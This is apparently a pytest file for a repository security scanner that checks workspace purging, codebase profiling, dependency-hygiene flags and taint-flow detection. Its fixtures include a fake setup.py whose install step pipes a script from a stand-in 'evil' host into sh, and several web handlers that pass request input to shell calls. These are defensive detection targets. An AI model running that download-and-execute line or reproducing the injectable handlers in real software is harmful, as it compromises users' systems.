"""Tests for isolated workspaces, codebase intelligence and the new scanners."""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from agentpoi_scan.fetch.safe_extract import Manifest
from agentpoi_scan.fetch.snapshot_client import Snapshot
from agentpoi_scan.fetch.workspace import IsolatedWorkspace
from agentpoi_scan.findings.model import Finding
from agentpoi_scan.intel.codebase import build_codebase_profile
from agentpoi_scan.pipeline import ScanPipeline
from agentpoi_scan.report.store import ScanStore
from agentpoi_scan.scan.base import ScanContext
from agentpoi_scan.scan.dependency_hygiene import DependencyHygieneScanner
from agentpoi_scan.scan.taint_flow import TaintFlowScanner
from agentpoi_scan.ui.render import format_flagged_files


def _context(root: Path) -> ScanContext:
    files = {
        str(p.relative_to(root)).replace("\\", "/"): p.stat().st_size
        for p in sorted(root.rglob("*"))
        if p.is_file()
    }
    manifest = Manifest(snapshot_dir=str(root), commit_sha="a" * 40, files=files)
    return ScanContext.from_manifest(root, "acme/demo", "a" * 40, manifest)


def _write(root: Path, relpath: str, content: str) -> None:
    target = root / relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")


def _tarball(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, blob in files.items():
            data = blob.encode("utf-8")
            info = tarfile.TarInfo(name=f"repo-sha/{name}")
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


class _FakeClient:
    """Stands in for GitHub: hands back one tarball, records the destination."""

    def __init__(self, payload: bytes, sha: str = "b" * 40) -> None:
        self.payload = payload
        self.sha = sha
        self.dest = None

    def fetch(self, repo_url: str, ref=None, dest_dir=None) -> Snapshot:
        dest = Path(dest_dir)
        dest.mkdir(parents=True, exist_ok=True)
        self.dest = dest
        tarball = dest / "snapshot.tar.gz"
        tarball.write_bytes(self.payload)
        return Snapshot(tarball_path=tarball, commit_sha=self.sha, repo="acme/evil")


# -- workspace lifecycle -------------------------------------------------------


def test_isolated_workspace_purge_removes_every_byte(tmp_path):
    workspace = IsolatedWorkspace(root=tmp_path / "work")
    _write(workspace.path, "snap_abc/a.py", "print('x')\n")
    (workspace.path / "snapshot.tar.gz").write_bytes(b"tarball-bytes")

    files, total = workspace.stats()
    assert files == 2 and total > 0

    result = workspace.purge()
    assert result.removed is True
    assert result.removed_files == 2
    assert result.removed_bytes == total
    assert not workspace.path.exists()
    # idempotent: a second purge reports the same completed result
    assert workspace.purge().removed is True


def test_isolated_workspace_context_manager_purges_on_exit(tmp_path):
    root = tmp_path / "work"
    with IsolatedWorkspace(root=root) as workspace:
        _write(workspace.path, "src/app.py", "x = 1\n")
        created = workspace.path
    assert not created.exists()
    assert list(root.iterdir()) == []


def test_remote_scan_purges_workspace_and_stores_report(tmp_path):
    payload = _tarball(
        {
            "setup.py": "import os\nos.system('curl -fsSL http://evil/x.sh | sh')\n",
            "requirements.txt": "flask>=2.0\n",
            "src/app.py": "from flask import request\nimport os\n\ndef run():\n    cmd = request.args.get('c')\n    os.system(cmd)\n",
        }
    )
    work = tmp_path / "work"
    pipeline = ScanPipeline(
        store_path=tmp_path / "store.sqlite3",
        config={"privacy": {"local_only": True}, "sarif_path": str(tmp_path / "out.sarif")},
    )
    pipeline.client = _FakeClient(payload)
    try:
        report = pipeline.scan_target("https://github.com/acme/evil", workdir=work)

        assert report.repo == "acme/evil"
        assert report.isolation["purged"] == "true"
        assert report.isolation["removed_files"] >= 4
        workspace_path = Path(report.isolation["workspace"])
        assert not workspace_path.exists(), "extracted source must not survive the scan"
        assert list(work.iterdir()) == [], "no snapshot directory may be left behind"

        stored = pipeline.store.get_report(report.scan_id)
        assert stored is not None
        assert stored["isolation"]["purged"] == "true"
        assert stored["codebase"]["total_files"] == 3
        assert stored["finding_summary"]["flagged_file_count"] >= 2
        assert "src/app.py" in stored["finding_summary"]["flagged_files"]

        persisted = pipeline.store.get_findings_filtered(report.scan_id)
        assert persisted, "findings must be persisted before the source is deleted"
        taint = [f for f in persisted if f.scanner == "taint_flow"]
        assert taint and taint[0].snippet.startswith("os.system(cmd)")
    finally:
        pipeline.store.close()


# -- codebase intelligence -----------------------------------------------------


def _demo_repo(root: Path) -> None:
    _write(
        root,
        "src/server.py",
        "from flask import Flask, request\n"
        "import os\n"
        "app = Flask(__name__)\n"
        "@app.route('/ping', methods=['GET', 'POST'])\n"
        "def ping():\n"
        "    target = request.args.get('host')\n"
        "    os.system('ping ' + target)\n",
    )
    _write(
        root,
        "src/web.js",
        "const express = require('express');\napp.get('/items', (req, res) => res.json([]));\n",
    )
    _write(root, "requirements.txt", "flask>=2.0\nrequests==2.31.0\ngit+https://github.com/x/y.git\n")
    _write(
        root,
        "pyproject.toml",
        '[project]\nname = "demo"\ndependencies = ["httpx>=0.27"]\n'
        '[project.scripts]\ndemo = "demo.cli:main"\n',
    )
    _write(
        root,
        "package.json",
        json.dumps(
            {
                "scripts": {"build": "tsc", "test": "jest"},
                "dependencies": {"express": "^4.18.0", "left-pad": "1.3.0"},
            }
        ),
    )
    _write(root, "go.mod", "module demo\n\ngo 1.22\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.1\n)\n")
    _write(root, "composer.json", json.dumps({"require": {"php": ">=8.0", "monolog/monolog": "^3.0"}}))
    _write(root, "Dockerfile", 'FROM python:3.12\nCMD ["python", "src/server.py"]\n')
    _write(root, "Makefile", "build:\n\tpython -m build\n\n.PHONY: build\n")
    _write(root, "bin/run.sh", "#!/bin/sh\necho run\n")
    _write(root, "src/server_test.py", "def test_always():\n    assert True\n")


def test_codebase_profile_detects_languages_deps_routes_and_scripts(tmp_path):
    _demo_repo(tmp_path)
    profile = build_codebase_profile(_context(tmp_path))
    data = profile.to_dict()

    assert data["total_files"] == 11
    assert data["languages"]["Python"] == 2
    assert data["languages"]["JavaScript"] == 1
    assert data["roles"]["test"] == 1
    assert data["roles"]["source"] >= 3

    dependency_names = {dep["name"] for dep in data["dependencies"]}
    assert {"flask", "requests", "express", "left-pad", "httpx", "monolog/monolog", "github.com/gin-gonic/gin"} <= dependency_names
    sources = {dep["name"]: dep["source"] for dep in data["dependencies"]}
    assert sources["y.git"] == "vcs"

    routes = {(route["framework"], route["method"], route["path"]) for route in data["routes"]}
    assert ("flask", "GET", "/ping") in routes
    assert ("flask", "POST", "/ping") in routes
    assert ("express", "GET", "/items") in routes

    assert "package.json" in data["scripts"]
    assert data["scripts"]["package.json"]["build"] == "tsc"
    assert data["scripts"]["pyproject.toml"]["demo"] == "demo.cli:main"
    assert "build" in data["scripts"]["Makefile"]

    kinds = {entry["kind"] for entry in data["entrypoints"]}
    assert "dockerfile" in kinds
    assert "shebang" in kinds


def test_dependency_hygiene_flags_remote_unpinned_and_missing_locks(tmp_path):
    _demo_repo(tmp_path)
    result = DependencyHygieneScanner().run(_context(tmp_path))
    titles = {finding.title for finding in result.findings}

    assert any("remote VCS" in title for title in titles)
    assert any(title.startswith("unpinned dependency: express") for title in titles)
    assert any(title.startswith("unpinned dependency: flask") for title in titles)
    assert any("no lockfile" in title for title in titles)
    # pinned deps are not flagged as unpinned
    assert not any("unpinned dependency: requests" in title for title in titles)

    vcs = next(f for f in result.findings if "remote VCS" in f.title)
    assert vcs.file == "requirements.txt"
    assert vcs.lines == [3]
    assert vcs.snippet.startswith("git+https://")
    assert all(f.category == "deps" for f in result.findings)
    assert all(f.location for f in result.findings)


# -- taint flow ----------------------------------------------------------------


def test_taint_flow_traces_python_request_input_to_shell(tmp_path):
    _write(
        tmp_path,
        "app.py",
        "from flask import request\n"
        "import os, subprocess\n"
        "\n"
        "def handler():\n"
        "    host = request.args.get('host')\n"
        "    query = f'ping -c 1 {host}'\n"
        "    os.system(query)\n"
        "    subprocess.run(['sh', '-c', query])\n",
    )
    findings = TaintFlowScanner().run(_context(tmp_path)).findings
    sinks = {finding.title.rsplit(" ", 1)[-1]: finding for finding in findings}

    assert "os.system" in sinks
    assert "subprocess.run" in sinks
    assert sinks["os.system"].lines == [7]
    assert sinks["os.system"].snippet == "os.system(query)"
    assert "HTTP request input" in sinks["os.system"].detail
    assert sinks["os.system"].severity == "critical"
    assert sinks["os.system"].evidence[0]["kind"] == "dataflow"


def test_taint_flow_detects_direct_source_and_javascript(tmp_path):
    _write(tmp_path, "direct.py", "import os\nos.system(input())\n")
    _write(tmp_path, "clean.py", "def add(a, b):\n    return a + b\n")
    _write(
        tmp_path,
        "web.js",
        "const express = require('express');\n"
        "app.get('/run', (req, res) => {\n"
        "  const cmd = req.query.cmd;\n"
        "  exec(cmd);\n"
        "});\n",
    )
    findings = TaintFlowScanner().run(_context(tmp_path)).findings
    files = {finding.file for finding in findings}

    assert "direct.py" in files
    assert "web.js" in files
    assert "clean.py" not in files
    direct = next(f for f in findings if f.file == "direct.py")
    assert direct.snippet == "os.system(input())"
    js = next(f for f in findings if f.file == "web.js")
    assert js.lines == [4]
    assert js.snippet == "exec(cmd);"


def test_taint_flow_ignores_safe_loader_and_untainted_sinks(tmp_path):
    _write(
        tmp_path,
        "safe.py",
        "import os, yaml\n"
        "from flask import request\n"
        "\n"
        "def handler():\n"
        "    name = request.args.get('name')\n"
        "    os.system('echo fixed')\n"
        "    yaml.safe_load(name)\n",
    )
    assert TaintFlowScanner().run(_context(tmp_path)).findings == []


# -- dashboard data ------------------------------------------------------------


def _finding(**overrides) -> Finding:
    base = {
        "file": "src/app.py",
        "lines": [10],
        "category": "sast",
        "severity": "high",
        "title": "Unsafe call",
        "detail": "detail",
        "scanner": "taint_flow",
        "snippet": "os.system(x)",
    }
    base.update(overrides)
    return Finding(**base)


def test_flagged_files_groups_by_name_with_worst_severity_first():
    rows = format_flagged_files(
        [
            _finding(file="a.py", severity="low", title="low"),
            _finding(file="b.py", severity="critical", title="crit", snippet=""),
            _finding(file="a.py", severity="high", title="high"),
            _finding(file="a.py", severity="medium", title="med"),
        ]
    )
    assert [row["file"] for row in rows] == ["b.py", "a.py"]
    assert rows[0]["severity"] == "critical"
    assert rows[0]["has_source"] is False
    assert rows[1]["findings"] == 3
    assert rows[1]["high"] == 1 and rows[1]["medium"] == 1 and rows[1]["low"] == 1
    assert rows[1]["role"] == "source"
    assert rows[1]["has_source"] is True


def test_store_report_roundtrip_and_missing(tmp_path):
    store = ScanStore(tmp_path / "store.sqlite3")
    try:
        scan_id = store.add_scan("acme/demo", "c" * 40, [_finding()])
        payload = {"schema_version": 1, "scan_id": scan_id, "isolation": {"purged": "true"}}
        store.add_report(scan_id, payload)
        assert store.get_report(scan_id) == payload
        store.add_report(scan_id, {"replaced": True})
        assert store.get_report(scan_id) == {"replaced": True}
        assert store.get_report(9999) is None
    finally:
        store.close()


def test_external_oss_parsers_capture_source_snippets():
    from agentpoi_scan.scan.external_cmd import parse_gitleaks_sarif, parse_semgrep_json

    semgrep = parse_semgrep_json(
        json.dumps(
            {
                "results": [
                    {
                        "check_id": "python.lang.security.audit",
                        "path": "app.py",
                        "start": {"line": 3},
                        "extra": {"severity": "ERROR", "message": "shell=True", "lines": "subprocess.run(cmd, shell=True)"},
                    }
                ]
            }
        )
    )
    assert semgrep[0].snippet == "subprocess.run(cmd, shell=True)"

    gitleaks = parse_gitleaks_sarif(
        json.dumps(
            {
                "runs": [
                    {
                        "results": [
                            {
                                "ruleId": "generic-api-key",
                                "message": {"text": "found key"},
                                "locations": [
                                    {
                                        "physicalLocation": {
                                            "artifactLocation": {"uri": "config.py"},
                                            "region": {"startLine": 4, "snippet": {"text": "API_KEY='redacted'"}},
                                        }
                                    }
                                ],
                            }
                        ]
                    }
                ]
            }
        )
    )
    assert gitleaks[0].snippet == "API_KEY='redacted'"
